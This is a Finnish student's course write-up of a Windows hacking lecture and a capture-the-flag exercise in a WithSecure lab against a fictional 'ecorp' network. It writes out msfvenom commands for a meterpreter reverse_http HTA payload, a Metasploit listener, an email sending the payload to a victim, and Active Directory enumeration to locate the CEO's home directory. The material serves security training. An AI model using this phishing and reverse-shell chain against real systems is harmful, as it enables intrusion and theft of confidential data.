# Johdanto

## <u> a) Nikita Ponomarev luento, Windows hakkerointi asiantuntija</u>

22.4 Kurssilla vieraili Nikita Ponomarev joka toimii WithSecurella turvallisuus konsulttina. Nikita on erikoistunut Microsoft ympäristöjen hakkerointiin ja murtamiseen.
Nikita piti teoriaosuuden Windows käyttöjärjestelmän murtautumisesta. Esityksessä Nikita käytti WithSecure omaa version Cyber Kill chainista.

Nikita näki tämän enemmän iteraatiomallina eikä ketjuna. WithSecuren käyttämään viitekehykseen kuuluu:

  - Reconnaisance
  - Delivery
  - Exploitation
  - C2
  - Persistence
  - Internal Reconnaisance
  - Lateral Movement
  - Action on objective

Luento oli silmiäavaava miten haavoittuvainen Windows käyttöympäristö voi olla. Luenolla keskityttiin Active Directoryn hyökkäykseen.
Suuri osa luennosta oli minulle melko vaikeaa ymmärtää mutta CTF harjoitteen aikana asiat alkoivat selviytymään. Harmi että aika loppui kesken ja tuki CTF tehtävään loppui lyhyeeseen.
Jatkan CTF tehtävää kotiläksynä

## <u> b) CTF WithSecure LAB ympäristössä</u>

WithSecure tarjosi mahdollisuuden käyttää heidän playgroundia johon oli valmiiksi rakennettu CTF tehtävä.

CTF oli rakennettu siten että opiskelijat voivat käynnistää virtuaalikoneen pilvessä. VPN yhteyden kautta opiskelijat voivat liittyä samaan verkkoon missä kohde 

<b>Tavoite: </b>Steal top secret information from the CEO's home directory.

<b>Initial foothold</b>

Harjoitteessa ei ollut tarkoitus harjoitella pääsyä järjestelmiin vaan pääsy järjestelmään oli yksinkertaistettu:

    Entry point: You can email larry.dyson@ecorp.com using the mail.ecorp.com server (DNS available at 192.168.22.151). 
    Every two minutes the recipient will open any attachments received via email.
    Note that due to licensing restrictions, the corporate workstations do not have Microsoft Office.  
Tehtävä oli mielestäni haastava joten jouduin nojautumaan paljon ohjeisiin.

Pääsy järjestelmään kuitenkin tapahtui lähettämällä `msfvenomilla` luotu haittaohjelma Larry Dysonille. Haittaohjelmana käytin meterpreter/reverse_http.
Lähettämisen jälkeen kohde avaa haittaohjelman ja avaa minulle pääsyn tietokoneelle. Tämän jälkeen aloitetaan hakkerointi!

VPN yhteyden ottaminen kohdeverkkoon:

    sudo openvpn foo.ovpn

foo.ovpn on tiedosto joka oli ladattavista WithSecure playground sivustolta.

Haitta ohjelman luominen:

    msfvenom -p windows/meterpreter/reverse_http -f hta-psh -o legit.hta LHOST=192.168.22.3 LPORT=80
    ## msfvenomilla tehty haittaohjelma. Tiedostomuoto on hta-psh ja nimi on legit.hta En tiedä mikä se on.
    ## Oma virtuaalikoneeni on reverse yhteyden vastaanottaja

msfconsole multi/handler asetukset:

    sudo msfconsole ## Metasploitable consoli
    use exploit/multi/handler ## mitä modulia käytetään
    set PAYLOAD windows/meterpreter/reverse_http ## Mitä haittaohjelmaa halutaan käyttää
    set LHOST 192.168.22.3 ## Oman virtuaalikoneeni IP osoite, Se osoite joka VPN yhteys antaa koneelle
    set LPORT 80 ## Portti jota multi/handler kuuntelee
    set ExitOnSession false ## msf console pysyy käynnissä 
    run -j ## kytkin -j pitää sessiota käynnissä taustalla

Sähköpostin lähettäminen kohdehenkilölle:

    sendemail -s 192.168.22.150 -f bob@example.com -t larry.dyson@ecorp.com -u Hello -m "Open this" -a legit.hta
    ## Lähetän sähköpostin osoitteeseen 192.168.22.150. -f = lähettäjä -t=vastaanottaja -u = otsikko -m = viesti -a=liite(oma haittaohjelmani)

Tässä vaiheessa törmäsin ongelmiin. Sain sähköpostin lähetettyä ja tulosteen että sähköposti lähetetty! Mutta kuitenkaan msfconsole ei saannut mitään yhteyksiä.
Toistin edelliset vaiheet useasti ja kokeilin vaihtaa omaa IP osoitetta. Mikään ei kuitenkaan toiminut.
Käytin myös nmap työkalua skannatakseni kohdeosoitetta ja varmistaa että portti 25 oli auki (SMTP)

    nmap -p 25 192.168.22.160 -Pn

Tulosteena sain että onhan se auki. Noin puolen tunnin pähkinnän jälkeen Nikita kysyi että oliko minulla mahdollisesti palomuuria käytössä. Ja olihan UFW käynnissä.
Tapoin sen demonin ja homma alkoi sujumaan.

    sudo systemctl stop ufw

Olisin voinnut antaa luvan portille 80 mutta aika alkoi loppumaan ja halusin vain aloittaa hakkeroimisen. Ongelmanselvityksessä tuli käytettyä nmap localhostia skannatakseni että olihan portti 80 vapaana eikä käytössä. Nmap on melko hyödyllinen työkalu.

**Investigate initial foothold**

What port does the corporate proxy use? You can find this value in the registry.

Tässä vaiheessa olin täysin hukassa. Kuitenkin nojauduin ohjeisiin.

    reg queryval -k "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" -v ProxyServer
    
  - reg: Tämä komento käynnistää toiminnon, jolla voidaan tehdä toimintoja Windows-rekisterissä.
  - queryval: Tämä alakomento suorittaa kyselyn rekisterin arvosta (value), joka vastaa määritettyä hakua.
  - -k "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings": Tämä määrittää rekisteriavaimen polun, josta halutaan hakea tietoa. Tässä tapauksessa se on "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings". Tämä polku liittyy Windowsin Internet-asetuksiin, kuten esimerkiksi välityspalvelimeen (Proxy Server).
  - -v ProxyServer: Tämä osa määrittää, että halutaan tarkastella tietyn nimistä arvoa (value) rekisteriavaimen alla. Tässä tapauksessa se tarkoittaa "ProxyServer"-nimistä arvoa.

Vastauksena sain port 2334.

**Identify your target**

What is the network path to the CEO's home directory? Query Active Directory to identify the CEO and their home directory.

Jälleen kerran nojauduin ohjeisiin ja tutkin komentoa myöhemmin.

    msf> use post/windows/gather/enum_ad_users ## Aseta hyökkäysmoduli
    ## Tässä tapauksessa käytetään aktiivihakemistojen käyttäjien tietojen hakemiseen
    msf> set SESSION 1 ## Aseta istunto jota kautta komennot suoritetaan. Session 1 = kohteen ajama haittaohjelma reverse http yhteys
    msf> set FILTER (title=Chief*) ## Aseta suodatin haettavien käyttäjätilien tuloksiin.
    msf> set ADDITIONAL_FIELDS title,homedirectory ## Aseta lisäkentät jotka haluan sisällyttää tuloksiin
    msf> set MAX_SEARCH 10 ## Aseta enimmäismäärä hakutuloksiin
    msf> run ## Käynnistää modulin.

Vastauksena sain useita osumia. Kuitenkin silmääni osui ensimmäisena Chief Executive officer ja hänen kotihakemistonsa

    \\ukpdfs04a.ad.ecorp.com\home\hwaters

SAMACCOUNT kyseiselle käyttäjälle oli myös hwaters. Muut käyttäjät käyttivät samanlaista muotoa SAMaccount kohdassa. Voidaan olettaa että CEO on henkilö jonka sukunimi on `walters`.

**Hunt for secrets**

Retrieve the flag from a password database kept by one of the users in their home directory. There is only one entry, named "flag".

Tehtävänä on siis löytää yhden käyttäjän kotihakemistosta salasana tietokanta nimellä `flag`. 

Aloitan tehtävän ottamalla yhteyden kohdekoneesen samalla tavalla miten `initial foothold` tehtävässä. Muutoksena kuitenkin sallin portti 80 palomuuriini:

    └─$ sudo ufw allow 80         
    Rule added
    Rule added (v6)

Avaessani VPN putken huomaan että virtuaalikoneeni IP osoite on muuttunut 192.168.22.2. Eli luon uudet haittaohjelmat:

    msfvenom -p windows/meterpreter/reverse_http lhost=192.168.22.3 lport=80 -f hta-psh -o payload1.hta

    
    msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
    payload => windows/meterpreter/reverse_http
    msf6 exploit(multi/handler) > set LHOST 192.168.22.2
    LHOST => 192.168.22.2
    msf6 exploit(multi/handler) > set LPORT 80
    LPORT => 80
    msf6 exploit(multi/handler) > run -j
    [*] Exploit running as background job 0.
    [*] Exploit completed, but no session was created.

    sendemail -s 192.168.22.150 -f bob@example.com -t larry.dyson@ecorp.com -u Hello -m "Open this" -a legit.hta

Ja jälleen kerran minulla on sessio auki kohdekoneelle. 
